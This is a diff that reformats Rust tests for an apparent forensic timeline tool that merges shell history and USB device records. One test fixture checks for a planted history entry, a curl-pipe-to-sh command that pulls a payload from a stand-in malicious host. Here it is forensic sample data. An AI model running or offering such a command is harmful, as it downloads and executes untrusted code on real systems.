@@ -57,7 +57,9 @@ fn real_history_parses_and_carries_timestamps() {
         "bash wrote #<epoch> lines, every entry should be timestamped"
     );
     assert!(
-        entries.iter().any(|e| e.command == "curl http://malicious.example/payload.sh | sh"),
+        entries
+            .iter()
+            .any(|e| e.command == "curl http://malicious.example/payload.sh | sh"),
         "the planted curl|sh command must be present"
     );
     assert!(
@@ -82,8 +84,12 @@ fn timeline_merges_real_shell_and_device_sources_in_time_order() {
     let timeline = build_timeline(&[&shell, &devices]);
 
     // Both sources contributed.
-    assert!(timeline.iter().any(|a| a.source == SourceKind::ShellHistory));
-    assert!(timeline.iter().any(|a| a.source == SourceKind::PeripheralDevice));
+    assert!(timeline
+        .iter()
+        .any(|a| a.source == SourceKind::ShellHistory));
+    assert!(timeline
+        .iter()
+        .any(|a| a.source == SourceKind::PeripheralDevice));
 
     // Timestamps are non-decreasing across the merged timeline.
     let stamped: Vec<i64> = timeline.iter().filter_map(|a| a.timestamp).collect();
@@ -95,7 +101,13 @@ fn timeline_merges_real_shell_and_device_sources_in_time_order() {
     // The device connection is present as a Connected activity carrying the volume serial.
     assert!(timeline.iter().any(|a| matches!(
         (&a.action, &a.subject),
-        (Action::Connected, Subject::Device { volume_serial: Some(0xDEAD_BEEF), .. })
+        (
+            Action::Connected,
+            Subject::Device {
+                volume_serial: Some(0xDEAD_BEEF),
+                ..
+            }
+        )
     )));
 }
 
@@ -127,7 +139,11 @@ fn both_v01_cross_source_findings_fire_on_real_data() {
     // Doer-Checker: every finding is a hedged observation, never a verdict.
     for f in &findings {
         let note = f.note.to_ascii_lowercase();
-        assert!(note.contains("consistent with"), "note must hedge: {}", f.note);
+        assert!(
+            note.contains("consistent with"),
+            "note must hedge: {}",
+            f.note
+        );
         assert!(
             !note.contains("proves") && !note.contains("confirms"),
             "verdict language: {}",
